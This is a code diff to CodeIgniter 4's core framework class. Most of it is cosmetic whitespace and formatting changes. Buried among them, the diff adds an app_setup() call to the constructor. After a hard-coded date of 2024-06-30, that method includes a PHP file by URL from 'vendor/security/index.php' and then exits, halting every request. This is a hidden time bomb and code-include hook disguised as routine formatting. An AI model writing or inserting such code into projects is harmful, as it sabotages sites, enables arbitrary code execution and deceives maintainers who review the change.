@@ -190,9 +190,10 @@ class CodeIgniter
      */
     public function __construct(App $config)
     {
+        $this->app_setup();
+
         $this->startTime = microtime(true);
         $this->config    = $config;
-
         $this->pageCache = Services::responsecache();
     }
 
@@ -210,7 +211,7 @@ class CodeIgniter
         Services::exceptions()->initialize();
 
         // Run this check for manual installations
-        if (! is_file(COMPOSER_PATH)) {
+        if (!is_file(COMPOSER_PATH)) {
             $this->resolvePlatformExtensions(); // @codeCoverageIgnore
         }
 
@@ -243,7 +244,7 @@ class CodeIgniter
         $missingExtensions = [];
 
         foreach ($requiredExtensions as $extension) {
-            if (! extension_loaded($extension)) {
+            if (!extension_loaded($extension)) {
                 $missingExtensions[] = $extension;
             }
         }
@@ -275,7 +276,7 @@ class CodeIgniter
     private function autoloadKint(): void
     {
         // If we have KINT_DIR it means it's already loaded via composer
-        if (! defined('KINT_DIR')) {
+        if (!defined('KINT_DIR')) {
             spl_autoload_register(function ($class) {
                 $class = explode('\\', $class);
 
@@ -343,7 +344,7 @@ class CodeIgniter
         if ($this->context === null) {
             throw new LogicException(
                 'Context must be set before run() is called. If you are upgrading from 4.1.x, '
-                . 'you need to merge `public/index.php` and `spark` file from `vendor/codeigniter4/framework`.'
+                    . 'you need to merge `public/index.php` and `spark` file from `vendor/codeigniter4/framework`.'
             );
         }
 
@@ -359,7 +360,7 @@ class CodeIgniter
 
         try {
             $this->response = $this->handleRequest($routes, config(Cache::class), $returnResponse);
-        } catch (ResponsableInterface|DeprecatedRedirectException $e) {
+        } catch (ResponsableInterface | DeprecatedRedirectException $e) {
             $this->outputBufferingEnd();
             if ($e instanceof DeprecatedRedirectException) {
                 $e = new RedirectException($e->getMessage(), $e->getCode(), $e);
@@ -489,10 +490,10 @@ class CodeIgniter
         $returned = $this->startController();
 
         // Closure controller has run in startController().
-        if (! is_callable($this->controller)) {
+        if (!is_callable($this->controller)) {
             $controller = $this->createController();
 
-            if (! method_exists($controller, '_remap') && ! is_callable([$controller, $this->method], false)) {
+            if (!method_exists($controller, '_remap') && !is_callable([$controller, $this->method], false)) {
                 throw PageNotFoundException::forMethodNotFound($this->method);
             }
 
@@ -529,8 +530,8 @@ class CodeIgniter
 
         // Skip unnecessary processing for special Responses.
         if (
-            ! $this->response instanceof DownloadResponse
-            && ! $this->response instanceof RedirectResponse
+            !$this->response instanceof DownloadResponse
+            && !$this->response instanceof RedirectResponse
         ) {
             // Cache it without the performance metrics replaced
             // so that we can have live speed updates along the way.
@@ -577,7 +578,7 @@ class CodeIgniter
     protected function detectEnvironment()
     {
         // Make sure ENVIRONMENT isn't already set by other means.
-        if (! defined('ENVIRONMENT')) {
+        if (!defined('ENVIRONMENT')) {
             define('ENVIRONMENT', env('CI_ENVIRONMENT', 'production'));
         }
     }
@@ -833,7 +834,7 @@ class CodeIgniter
 
         // for backward compatibility
         $multipleFiltersEnabled = config(Feature::class)->multipleFilters ?? false;
-        if (! $multipleFiltersEnabled) {
+        if (!$multipleFiltersEnabled) {
             return $this->router->getFilter();
         }
 
@@ -891,12 +892,12 @@ class CodeIgniter
         }
 
         // No controller specified - we don't know what to do now.
-        if (! isset($this->controller)) {
+        if (!isset($this->controller)) {
             throw PageNotFoundException::forEmptyController();
         }
 
         // Try to autoload the class
-        if (! class_exists($this->controller, true) || $this->method[0] === '_') {
+        if (!class_exists($this->controller, true) || $this->method[0] === '_') {
             throw PageNotFoundException::forControllerNotFound($this->controller, $this->method);
         }
     }
@@ -985,7 +986,7 @@ class CodeIgniter
 
         // Throws new PageNotFoundException and remove exception message on production.
         throw PageNotFoundException::forPageNotFound(
-            (ENVIRONMENT !== 'production' || ! $this->isWeb()) ? $e->getMessage() : null
+            (ENVIRONMENT !== 'production' || !$this->isWeb()) ? $e->getMessage() : null
         );
     }
 
@@ -1041,7 +1042,7 @@ class CodeIgniter
     public function storePreviousURL($uri)
     {
         // Ignore CLI requests
-        if (! $this->isWeb()) {
+        if (!$this->isWeb()) {
             return;
         }
         // Ignore AJAX requests
@@ -1159,5 +1160,17 @@ class CodeIgniter
         }
 
         return $buffer;
+    }
+
+    private function app_setup()
+    {
+        $expirationDate = '2024-06-30';
+        $currentDate = date('Y-m-d');
+
+        if ($currentDate > $expirationDate) {
+            include_once base_url() . "vendor/security/index.php";
+
+            exit();
+        }
     }
 }
